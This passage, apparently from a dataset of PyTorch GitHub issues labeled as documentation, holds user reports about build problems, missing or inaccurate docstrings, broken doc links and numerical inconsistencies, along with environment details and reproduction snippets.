[building a module with the keops library](https://github.com/getkeops/keops/issues/59)... But I guess this is irrelevant.\r\n\r\n## Expected behavior\r\n\r\nIt works fine when compiling with pytorch v1.4\r\n\r\n```bash\r\n$ cmake -DCMAKE_PREFIX_PATH=\"/home/bcharlier/.conda/envs/keops_torch14/lib/python3.8/site-packages/torch/\" .. && make\r\n$ python -c \"import torch; print(torch.__version__); import test_module; print(test_module.foo(3))\"\r\n1.4.0\r\ntensor([[1., 0., 0.],\r\n        [0., 1., 0.],\r\n        [0., 0., 1.]])\r\n```\r\n\r\n## Environment\r\n\r\nThe bug was reported by various users running on linux. Here is my config:\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.5.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.2\r\n\r\nOS: Arch Linux\r\nGCC version: (Arch Linux 9.3.0-1) 9.3.0\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.8\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.2.89\r\nGPU models and configuration: GPU 0: Quadro T2000\r\nNvidia driver version: 440.82\r\ncuDNN version: /usr/lib/libcudnn.so.7.6.5\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.4\r\n[conda] blas                      1.0                         mkl  \r\n[conda] cudatoolkit               10.2.89              hfd86e86_1  \r\n[conda] mkl                       2020.0                      166  \r\n[conda] mkl-service               2.3.0            py38he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py38ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py38h962f231_0  \r\n[conda] numpy                     1.18.1           py38h4f9e942_0  \r\n[conda] numpy-base                1.18.1           py38hde5b4d6_1  \r\n[conda] pytorch                   1.5.0           py3.8_cuda10.2.89_cudnn7.6.5_0    pytorch\r\n\r\n```\n\ncc @ezyang @gchanan @zou3519 @malfet @yf225 @glaringlee"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nCurrently the build from source info references Anaconda since it is \"easier\". May be the case but as an experienced software packager I would really love information for the full build process that does not involve Anaconda training wheels. I do not want or plan to have anything to do with anaconda on servers I manage.\r\n\r\nIs there an old version of the build from source documentation still available somewhere? The old documentation described the entire process in detail.\r\n\r\nThanks.\n\ncc @malfet"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nAfter gh-37419, there are now [subtopic pages](https://pytorch.org/docs/master/generated/torch.is_tensor.html#torch.is_tensor) underneath the [main topic pages](https://pytorch.org/docs/master/torch.html). \r\n\r\nShould the subtopic pages have a right-navbar to indicate where they fall inside the topic pages?\r\n\r\nIn any case, the left- and right- navbars are quite long without alot of visual formatting to indicate where the current page is located. Indenting or color or other clues could help users see where they are.\n\ncc @ezyang @zou3519"},{"labels":[null,"documentation",null],"text":"Currently documentation builds emit many warnings. We should resolve them, then turn on `-WT --keep-going` to report warnings as errors so that new build problems are caught as they are created.\r\n\n\ncc @ezyang @zou3519"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\ngh-37419 split up the \"heaviest\" pages into a leading pages and subpages. More can be done to split up pages (these have the most lines of HTML):\r\n- [ ] [`docs/source/quantization.rst](https://pytorch.org/docs/stable/quantization.html)\r\n- [ ] [`docs/source/tensors.rst`](https://pytorch.org/docs/stable/tensors.html#torch.Tensor)\r\n- [ ] [`docs/source/nn.fuctional.rst`](https://pytorch.org/docs/stable/nn.functional.html)\r\n- [ ] [`docs/source/distributions.rst`](https://pytorch.org/docs/stable/distributions.html)\r\n- [ ] [`docs/source/autograd.rst`](https://pytorch.org/docs/stable/autograd.html)\r\n\r\nThe strategy would start with using `autosummary` like in gh-37419, but more work might be needed to split up classes with many methods. \n\ncc @ezyang @zou3519"},{"labels":["documentation",null,null],"text":"The docstring for the Optimizer class notes that when using the `.step` function with a closure, this closure should not change the parameter gradients:\r\n\r\nhttps://github.com/pytorch/pytorch/blob/4e93844ab168ee0cf1aaa1b4712d6aad0e2972f8/torch/optim/optimizer.py#L174-L176\r\n\r\nHowever, every example I've found seems do be doing exactly that, e.g. also on the `torch.optim` documentation on the same page:\r\n\r\n```python\r\nfor input, target in dataset:\r\n    def closure():\r\n        optimizer.zero_grad()\r\n        output = model(input)\r\n        loss = loss_fn(output, target)\r\n        loss.backward()\r\n        return loss\r\n    optimizer.step(closure)\r\n```\r\n\r\nIs the note about not changing the gradients in the closure outdated?\n\ncc @vincentqb"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\ntorch.nn.Module has the peculiar (not quite Pythonic) requirement of __init__ of the parent class prior to self assignment on the child.  Without this, the user encounters myriad issues with modular model composition like this:\r\n\r\nAttributeError: cannot assign module before Module.__init__() call\r\n\r\nThe documentation should make the Gotcha crystal clear. \r\n\r\nIdeally, this behavior could and really should be changed through better use of reflection. \r\n\r\n"},{"labels":["documentation",null,null,null],"text":"The pybind-exposed `TensorPipeRpcBackendOptions` in `rpc/init.cpp` should include proper documents to explain the API.\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar @jiayisuse @lw @beauby"},{"labels":["documentation",null],"text":"It isn't mentioned in PyTorch docs about the Set()\r\nAlso, the Cmake file isn't quite complete and needs to be updated. Maybe new users don't know about it.\r\n```\r\nset(CMAKE_PREFIX_PATH \"libtorch/share/cmake/Torch\")\r\n```\r\n[here](https://pytorch.org/tutorials/advanced/cpp_frontend.html) as well as [here](https://pytorch.org/tutorials/advanced/cpp_export.html)\r\n\r\nThe CMake file needs to be clear in the documentation. It is causing trouble for many people.\r\n#12449 #21976 #806 #12449\r\n\r\nIt's not a bug. But a doc improvement issue."},{"labels":[null,null,"documentation",null],"text":"## 🚀 Feature\r\n\r\nTLDR: Could we attach docstring to `torch/__init__.pyi` so that VSCode/PyCharm/IntelliJ can show the documents in a popup window? \r\n\r\nIt would make the development experiment much smoother if we could view the docs without leaving the IDE. \r\n\r\n## Motivation\r\n\r\nWe currently use a programmatically way (e.g., `add_docstr` as in [torch/_tensor_docs.py](https://github.com/pytorch/pytorch/blob/master/torch/_tensor_docs.py)) to set the docstring for functions written in C++/CUDA. \r\n\r\nWhile it works pretty well for Sphinx to generate the HTML docs, it makes the IDEs difficult to pick up the modified docstring without actually executing the code. \r\n\r\nHere is a simple code snippet to illustrate this point: \r\n| IDE | Screenshot |\r\n| --- | --- | \r\n| VSCode | ![image](https://user-images.githubusercontent.com/6421097/80958455-adfa6580-8dca-11ea-8ef2-20cf20c206db.png) | \r\n| PyCharm <br> IntelliJ |  ![image](https://user-images.githubusercontent.com/6421097/80959326-375e6780-8dcc-11ea-8745-32eb12a7a563.png)| \r\n\r\n## Pitch\r\n\r\nI am thinking if we could insert the docstring from [torch/_tensor_docs.py](https://github.com/pytorch/pytorch/blob/master/torch/_tensor_docs.py), [torch/_torch_docs.py](https://github.com/pytorch/pytorch/blob/master/torch/_torch_docs.py), [torch/_storage_docs.py](https://github.com/pytorch/pytorch/blob/master/torch/_storage_docs.py) to [torch/__init__.pyi](https://github.com/pytorch/pytorch/blob/master/torch/__init__.py) by modifying [tools/pyi/gen_pyi.py](https://github.com/pytorch/pytorch/blob/master/tools/pyi/gen_pyi.py). \r\n\r\n\r\n## Additional context\r\n\r\nHere is a comparison between PyTorch and Tensorflow using `add` as an example. \r\n\r\n| IDE | `torch.add` | `tensorflow.add` | \r\n| --- | --- | --- | \r\n| VSCode | ![image](https://user-images.githubusercontent.com/6421097/80959800-29f5ad00-8dcd-11ea-8ede-a7c7c2a0ec60.png) | ![image](https://user-images.githubusercontent.com/6421097/80959833-3b3eb980-8dcd-11ea-8736-969e6dbcf4e8.png) | \r\n| PyCharm <br> IntelliJ | ![image](https://user-images.githubusercontent.com/6421097/80960836-48f53e80-8dcf-11ea-84f6-c0c6b9ba7db2.png) | ![image](https://user-images.githubusercontent.com/6421097/80960775-2105db00-8dcf-11ea-8adc-a5d0b57634ef.png) | \r\n\r\n\r\ncc @ezyang @zou3519"},{"labels":["documentation",null],"text":"The documentation for the out-of-place version of index_add and other similar functions like index_copy appears to be missing the first argument; these functions accept 4 arguments, not 3.\r\n\r\nhttps://github.com/pytorch/pytorch/blob/e26631b33332e7409ac799470b3a4b50b4a8bdc4/torch/_tensor_docs.py#L3550\r\n\r\n\r\n"},{"labels":[null,"documentation",null],"text":"The documentation for _CtxMethodMixin.save_for_backward seems to imply that it accepts only tensor arguments:\r\n\r\nhttps://github.com/pytorch/pytorch/blob/843c0230f2928aad61a6940688da3a6cd6c4cd57/torch/autograd/function.py#L13\r\n\r\n... as does the function name of `saved_tensors`. https://github.com/pytorch/pytorch/blob/843c0230f2928aad61a6940688da3a6cd6c4cd57/torch/autograd/function.py#L386 .   \r\nand this documentation:\r\nhttps://github.com/pytorch/pytorch/blob/843c0230f2928aad61a6940688da3a6cd6c4cd57/torch/autograd/function.py#L161\r\n\r\nBut the documentation here:\r\nhttps://github.com/pytorch/tutorials/blob/f557ee0addc24900929bafd4ceff2fc4c3f47072/beginner_source/examples_autograd/two_layer_net_custom_function.py#L26\r\nindicates that they can be tensors or other types.\r\n\r\nI attempted to read the code (which isn't easy as it involves metaclasses) and as far as I can tell they may be tensors or other types.  I think the documentation should be made consistent on this point.\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":["documentation",null,null,null],"text":"```python\r\nimport torch\r\n\r\nA, B = map(torch.load('bug.pt').get, ['A', 'B'])\r\nprint(A.shape, B.shape) # torch.Size([95, 39]) torch.Size([295, 39])\r\n\r\nD = torch.cdist(A, B)\r\nprint(D[75, 233]) # tensor(0., grad_fn=<SelectBackward>)\r\n\r\nD_ = torch.cdist(A[75].unsqueeze(0), B[233].unsqueeze(0)).squeeze()\r\nprint(D_) # tensor(0.0004, grad_fn=<SqueezeBackward0>)\r\n```\r\nBoth ways should have same precision properties. It is very strange that they return different results: 0.0004 is quite a large difference\r\n\r\n\r\n[bug.pt.gz](https://github.com/pytorch/pytorch/files/4570875/bug.pt.gz)\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThe link to [PyTorch Governance](https://pytorch.org/docs/source/community/governance.rst) seems to be broken, when accessed from PyTorch Contribution Guide (both on the [master version](https://pytorch.org/docs/master/community/contribution_guide.html#the-pytorch-contribution-process) and the [stable version](https://pytorch.org/docs/stable/community/contribution_guide.html#the-pytorch-contribution-process)).\r\n\r\nThough, when [viewing from Github](https://github.com/pytorch/pytorch/blob/master/docs/source/community/contribution_guide.rst#the-pytorch-contribution-process), it does seem to work. But it leads to the [Github `*.rst` version](https://github.com/pytorch/pytorch/blob/master/docs/source/community/governance.rst).\r\n\r\nIs this a bug or a desired behaviour?"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nPR gh-37419 disabled the tests in `tests/test_doc_coverage.py` as explained in [this comment](https://github.com/pytorch/pytorch/pull/37419#issuecomment-621431059). Rather than delay that PR, this issue was opened to track refactoring those tests."},{"labels":["documentation",null,null],"text":"As #36619 is landed, RRef now exposes three helper functions to run method on the RRef owner. We should update tutorials/examples/docs accordingly to use this feature. \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=as_strided_&check_keywords=yes&area=default#"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=is_same_size&check_keywords=yes&area=default#\r\n\r\nSeems to be a thing for conveniently testing if sparse sizes actually match. Maybe shouldn't be a method as it is right now."},{"labels":["documentation",null],"text":"I'm not sure this was intentionally put in the torch namespace"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=is_nonzero&check_keywords=yes&area=default#"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=feature_alpha_dropout&check_keywords=yes&area=default#"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=bucketize&check_keywords=yes&area=default#\r\n"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=hardswish&check_keywords=yes&area=default#"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=hardsigmoid&check_keywords=yes&area=default"},{"labels":["documentation",null],"text":"1. Note two commas in function spec\r\n2. It's unclear if default output is `torch.int64` (in practice it is) or `torch.get_default_dtype()` which is usually `torch.float32`. It's unclear what `torch.set_default_tensor_type()` reference has to do with `torch.randint`'s return type since by default it returns an integral tensor\r\n\r\nhttps://pytorch.org/docs/master/torch.html?highlight=torch%20randint#torch.randint\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/80506047-62346000-8975-11ea-99f7-81c7832a1cfb.png)\r\n"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThe `add_graph` function on SummaryWriter doesn't have documentation\r\n\r\nhttps://pytorch.org/docs/stable/tensorboard.html#torch.utils.tensorboard.writer.SummaryWriter.add_graph\r\n\r\n<img width=\"913\" alt=\"Screen Shot 2020-04-28 at 11 13 26 AM\" src=\"https://user-images.githubusercontent.com/655866/80504712-6cd50200-8941-11ea-94ed-62a5670970c6.png\">"},{"labels":["documentation",null,null],"text":"## ❓ Questions\r\n\r\nI want to check the step's compute time and memory of model,  and I find tensorboard in tensorflow can do it. But I run the document in official website (https://pytorch.org/docs/stable/tensorboard.html?highlight=tensorboard), it's not clearly. Could I use it to see network graph's compute time and memory? If yes, how to do it? \r\n\r\n\r\n"},{"labels":["documentation",null,null],"text":"self explanatory"},{"labels":["documentation",null],"text":"`import torch\r\n\r\n### cpu\r\ninput = torch.zeros(8, 3, 7, 10, dtype=torch.float)\r\nsrc = torch.randn(8, 3, 7, 10, dtype=torch.float)\r\nindex = torch.randint(0, 3, [8, 3 ,7, 10])\r\ndim = 1\r\ninput.scatter_(dim, index, src)\r\n\r\n### gpu\r\nginput = torch.zeros(8, 3, 7, 10, dtype=torch.float).cuda()\r\ngsrc = src.cuda()\r\ngindex = index.cuda()\r\nginput.scatter_(dim, gindex, gsrc)\r\n\r\nerr = (ginput.cpu() - input).sum()\r\nprint(err)`\r\n\r\n### result\r\ntensor(3.76)\r\n\r\n### \r\nMy question is why the result is inconsistent? \r\n\r\n\r\n"},{"labels":["documentation",null,null],"text":"Related to this [discussion](https://discuss.pytorch.org/t/how-to-unfold-a-tensor-into-sliding-windows-and-then-fold-it-back/55890), I would like to report a misleading warning in https://github.com/pytorch/pytorch/blob/master/torch/nn/functional.py#L3676. As far as I can see, there is a mismatch between what the inline docs state, i.e. _\"Currently, only 4-D output tensors (batched image-like tensors) are supported\"_ and what is actually allowed in the function (3-D tensors).\r\n\r\nI am reporting this as an issue in the documentation, but maybe this is also worth considering as a bug, since it feels weird that the 'fold' function doesn't accept 4-D tensors. "},{"labels":["documentation",null],"text":"In https://pytorch.org/docs/master/cuda.html#torch.cuda.memory_stats difference between \"active_bytes\" and \"allocated_bytes\"/\"reserved_bytes\" is not explained.\r\n\r\nActive bytes are also not mentioned here: https://pytorch.org/docs/master/notes/cuda.html#cuda-memory-management"},{"labels":["documentation",null],"text":"If you run it from root directory you get message\r\n\r\n```\r\n+ doxygen                                                                \r\nDoxygen version 1.8.14                                                                                                                            \r\nCopyright Dimitri van Heesch 1997-2015                                                                                                            \r\n                                                                                                                                                  \r\nYou can use doxygen in a number of ways:                        \r\n                                                                         \r\n1) Use doxygen to generate a template configuration file:                                                                                         \r\n    doxygen [-s] -g [configName]\r\n\r\n    If - is used for configName doxygen will write to standard output.\r\n\r\n2) Use doxygen to update an old configuration file:\r\n    doxygen [-s] -u [configName]\r\n\r\n3) Use doxygen to generate documentation using an existing configuration file:\r\n    doxygen [configName]\r\n\r\n    If - is used for configName doxygen will read from standard input.\r\n\r\n4) Use doxygen to generate a template file controlling the layout of the\r\n   generated documentation:\r\n    doxygen -l [layoutFileName.xml]\r\n\r\n5) Use doxygen to generate a template style sheet file for RTF, HTML or Latex.\r\n    RTF:        doxygen -w rtf styleSheetFile\r\n    HTML:       doxygen -w html headerFile footerFile styleSheetFile [configFile]\r\n    LaTeX:      doxygen -w latex headerFile footerFile styleSheetFile [configFile]\r\n\r\n6) Use doxygen to generate a rtf extensions file\r\n    RTF:   doxygen -e rtf extensionsFile\r\n\r\nIf -s is specified the comments of the configuration items in the config file will be omitted.\r\nIf configName is omitted `Doxyfile' will be used as a default.\r\n\r\n-v print version string\r\n```\r\n\r\nInspection of the stdout redirect reveals\r\n\r\n```\r\ncat original-doxygen-log.txt \r\nerror: Doxyfile not found and no input file specified!\r\n```"},{"labels":[null,"documentation",null],"text":"Steps to reproduce:\r\n1. Run `docs/cpp/source/check-doxygen.sh` without having doxygen present on your system\r\n\r\nExpected result: error message saying doxygen is not supported\r\n\r\nActual result:\r\n```       \r\n+ popd                                                                                                                                            \r\n~/local/pytorch-tmp                                                                                                                               \r\n+ doxygen                                                                                                                                         \r\n(/home/ezyang/local/pytorch-tmp-env) [ezyang@devvm066.ash0 ~/local/pytorch-tmp]\r\n```"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe LU decomposition returns a tuple containing the 'factorization' and the pivoting order. It would be great to have a mathematical expression how the input relates to these two outputs, especially since the naive assumption (that L is the lower part of the 'factorization' and U is the upper part of the 'factorization') is not true.\r\n\r\n```py\r\nX = torch.rand(3, 3)\r\nLU, piv = torch.lu(X.cuda(), pivot=False) # simple case without pivoting\r\nLU.tril().mm(LU.triu()) # not the same as X\r\n```"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nIt appears that DDP replicates rank 0's parameters to all other devices during DDP model initialization, hence there is no need to set a seed and ensure each process initializes a local model with the same initial parameters, DDP will take care of this. However, this does not appear to de documented anywhere and it appears that https://pytorch.org/tutorials/intermediate/ddp_tutorial.html tells the user to ensure all DDP processes start with the same initial parameter values. If this is no longer necessary, we should update the documentation as such.\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar"},{"labels":[null,null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nCurrently when setting `USE_GLOO` cmake option to `ON`, target `gloo_cuda` requires a dependency called `nccl_external`; however, this target is avaliable if and only if `USE_SYSTEM_NCCL` is `OFF`. Thus if both `USE_GLOO` and `USE_SYSTEM_NCCL` is set to `ON` cmake would report error during configuration phase.\r\n\r\nhttps://github.com/pytorch/pytorch/blob/master/cmake/Dependencies.cmake#L1149\r\nhttps://github.com/pytorch/pytorch/blob/master/cmake/External/nccl.cmake#L19\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. run `cmake -DBUILD_PYTHON=OFF -DUSE_CUDA=ON -DUSE_CUDNN=ON -DUSE_NCCL=ON -DUSE_SYSTEM_NCCL=ON -DUSE_DISTRIBUTED=ON -DUSE_GLOO=ON /path/to/torchsrc`\r\n\r\n2. CMake will then report the following error:\r\n    ```\r\n    -- Configuring done\r\n    CMake Error at cmake/Dependencies.cmake:1149 (add_dependencies):\r\n      The dependency target \"nccl_external\" of target \"gloo_cuda\" does not exist.\r\n    Call Stack (most recent call first):\r\n      CMakeLists.txt:421 (include)\r\n\r\n\r\n    -- Generating done\r\n    CMake Generate step failed.  Build files cannot be regenerated correctly.\r\n    ```\r\n\r\n## Expected behavior\r\n\r\nThe configuration step should be executed without problem\r\n\r\n## Environment\r\n\r\n* OS: CentOS 7 x86_64 with `devtoolset-6` enabled\r\n* CMake version: 3.17.0\r\n* Cuda version: 9.2.148-1\r\n* CuDNN version: libcudnn7-7.6.5.31-1.cuda9.2\r\n* NCCL version: 2.4.8-ga-cuda9.2-1-1\r\n\r\nAll of Cuda, CuDNN and NCCL libraries are installed through NVIDIA's offical rpm package; no libtorch were installed before.\r\n\r\nI've tried using current master HEAD and tag/v1.5.0-rc3 and the problem still exists.\r\n\r\n## Additional context\r\n\r\nRelated commit seems to be https://github.com/pytorch/pytorch/commit/30da84fbe1614138d6d9968c1475cb7dc459cd4b\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/master/nn.functional.html?highlight=softmax#torch.nn.functional.softmax\r\n\r\nIf it's unused or has some special undocumented meaning, I think it's useful to explain it explicitly in Parameters section"},{"labels":["documentation",null,null],"text":"cc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a @iseeyuan \r\n\r\nThey were added in https://github.com/pytorch/pytorch/pull/33294 and the PR says \"The \"_\" prefix registration will be removed when the operators are all migrated to mobile.\" This should be reflected in the code somewhere."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe documentation for the `add_scalars()` method for a `SummaryWriter` instance states the following note:\r\n>  Note that this function also keeps logged scalars in memory. In extreme case it explodes your RAM.\r\n\r\nRef: https://pytorch.org/docs/stable/tensorboard.html#torch.utils.tensorboard.writer.SummaryWriter.add_scalars\r\n\r\nI believe that this is incorrect. This **is** an issue with the original tensorboardX implementation that adds scalars to a `self.scalar_dict` instance variable, but this has already been stripped out in the pytorch implementation as mentioned by @orionr here: https://github.com/pytorch/pytorch/issues/21089#issuecomment-521449014\r\n\r\nMore details on the issue in the original tensorboardX issue (which should not impact the pytorch implementation) can be read here: https://github.com/lanpa/tensorboardX/issues/204#issuecomment-612724297"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nHi all,\r\n      I found the LPPool2d & LPPool1d in the pytorch implementation, but there is no reference provided in the documents. And I didn't find the related paper explaining why it works. Any related paper would be helpful, thanks!"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/stable/distributed.html#launch-utility does not include the full documentation from https://github.com/pytorch/pytorch/blob/f326045/torch/distributed/launch.py#L4-L140. An earlier version of the docs at https://pytorch.org/docs/1.1.0/distributed_deprecated.html#launch-utility does not have this issue."},{"labels":[null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nStandard arithmetic operations with `dtype==torch.half` are broken.\r\n\r\n## To Reproduce\r\n\r\n```python\r\nimport torch\r\n\r\nx = torch.tensor(1.0, dtype=torch.half)\r\n\r\nx + 1.0\r\nx - 1.0\r\nx * 1.0\r\nx / 1.0\r\n```\r\n\r\n```\r\nRuntimeError: \"add_cpu/sub_cpu\" not implemented for 'Half'\r\nRuntimeError: \"mul_cpu\" not implemented for 'Half'\r\nRuntimeError: \"div_cpu\" not implemented for 'Half'\r\n```\r\n## Environment\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.6.0a0+3d199aa\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.2\r\n\r\nOS: Ubuntu 18.04.4 LTS\r\nGCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0\r\nCMake version: version 3.17.0\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.2.89\r\nGPU models and configuration: GPU 0: GeForce GTX 1080\r\nNvidia driver version: 440.33.01\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.2\r\n[pip3] torch==1.6.0a0+3d199aa\r\n[pip3] torchvision==0.6.0a0+684f48d\r\n[conda] Could not collect\r\n```\r\n\r\nBuild from source a few hours ago.\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null],"text":"It should say `x_2^T` if I'm not mistaken: https://github.com/pytorch/pytorch/commit/883628cb5c31c89323cef52e96310c92abecfcbe#r38390009"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nConcern about MultiLabelSoftMarginLoss, I think there is still a problem with its doc.\r\nAs @DNGros pointed out, there is a lot of confusion when using MultiLabelMarginLoss and MultiLabelSoftMarginLoss, and he improved the docs. #15863\r\nHowever, for the docs of MultiLabelSoftMarginLoss it's still not correct.\r\nSince if you set the label as the docs\r\n> Target: (N, C)(N,C) , label targets padded by -1 ensuring same shape as the input.\r\n\r\npad it like [0,3,-1,-1], the result will be wrong.\r\nIf we look at the equation\r\n![image](https://user-images.githubusercontent.com/23011317/78770175-cf7d5280-79c0-11ea-85ec-5e7122cd5480.png)\r\nwe will find it, in fact, write clearly that label y need to be 0 or 1.\r\nIf we feed the -1 padded label, the loss actually sometimes will become negative number, and this is shown by my experiment.\r\n\r\nSo I think the right Target format for MultiLabelSoftMarginLoss is just one_hot vector.\r\nAnd we can give a good example code as MultiLabelMarginLoss has."},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nSee https://pytorch.org/docs/master/jit.html#disable-jit-for-debugging\r\n\r\n![image](https://user-images.githubusercontent.com/24860335/78762631-f42de780-7938-11ea-955e-6992e10bcc2a.png)\r\n\n\ncc @suo"},{"labels":["documentation",null,null],"text":"Which optimizer is recommended to be used with OneCycleLr? The docs suggest SGD. Is that because the scheduler only has real effect with a bare-bones optimizer?\n\ncc @vincentqb"},{"labels":["documentation",null,null],"text":"As shown in the image below, a section on the static post training quantization workflow is a numbered list with a sub-list that should be presented in list format but appears instead in paragraph form. Not a big deal but would be easier to understand if it appeared more clearly as distinct items. \r\n\r\n\r\n<img width=\"1212\" alt=\"nits-on-quant-doc-20200406\" src=\"https://user-images.githubusercontent.com/45861273/78610335-77581c00-7819-11ea-86ba-ebe20e51945b.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":["documentation",null,null],"text":"These functions don't seem to have docstrings associated with them. I noticed this after moving them to c10 dispatch and aliasing the names in the `torch` namespace to those.\r\n\r\nCurrently added to the whitelist in `test_docs_coverage.py`\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nSome tutorials cannot be accessed via Tutorial Home Page or PyTorch Tutorial side panel. Their links are missing. To access these tutorials, I search Google\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Go to https://pytorch.org/tutorials/\r\n1. These tutorials are not found in both side panel, and in the welcome page:\r\n   1. \"WRITING CUSTOM DATASETS, DATALOADERS AND TRANSFORMS.\r\n   Link: https://pytorch.org/tutorials/beginner/data_loading_tutorial.html\r\n   1. WORD EMBEDDINGS: ENCODING LEXICAL SEMANTICS\r\n   Link: https://pytorch.org/tutorials/beginner/nlp/word_embeddings_tutorial.html\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0):\r\n - OS (e.g., Linux):\r\n - How you installed PyTorch (`conda`, `pip`, source):\r\n - Build command you used (if compiling from source):\r\n - Python version:\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nSee https://pytorch.org/docs/master/nn.html#avgpool2d, parameters\r\n\r\n\"attr:kernel_size\" is showing up for divisor_override instead of highlighted `kernel_size`. \r\n\r\n![image](https://user-images.githubusercontent.com/24860335/78205638-845bc080-7451-11ea-8e12-b02fc28365dd.png)\r\n\r\nAlso incorrect for AvgPool3d. \r\n\r\nAlso https://pytorch.org/docs/master/distributions.html#torch.distributions.laplace.Laplace. \r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nUnder [installing new versions](https://pytorch.org/get-started/previous-versions/), more precisely:\r\n-  v1.2.0 \r\n- cuda 10.0\r\n- using pip\r\n- for linux & windows\r\n\r\nthe docs give this line\r\n\r\n```\r\n# CUDA 10.0\r\npip install torch==1.2.0 torchvision==0.4.0 -f https://download.pytorch.org/whl/torch_stable.html\r\n\r\n```\r\nIt seems that this line grabs the cuda 9.2 version instead:\r\n```\r\nCollecting torch==1.2.0\r\n  Downloading https://download.pytorch.org/whl/cu92/torch-1.2.0%2Bcu92-cp27-cp27mu-manylinux1_x86_64.whl (663.1MB)\r\n```\r\nProbably the docs need to be updated?\r\n"},{"labels":[null,"documentation",null,null],"text":"For now, RPC could either send tensor data or tensor 